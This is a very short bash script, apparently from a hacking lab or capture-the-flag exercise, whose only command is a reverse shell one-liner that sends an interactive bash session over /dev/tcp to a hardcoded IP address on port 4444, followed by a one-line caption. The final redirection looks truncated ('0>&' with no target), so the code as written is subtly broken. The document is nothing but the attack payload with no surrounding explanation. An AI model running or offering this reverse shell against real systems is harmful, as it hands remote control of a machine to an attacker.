```bash
#!/bin/bash 

bash -i >& /dev/tcp/10.50.130.228/4444 0>&
```

Bash shell using a bash reverse script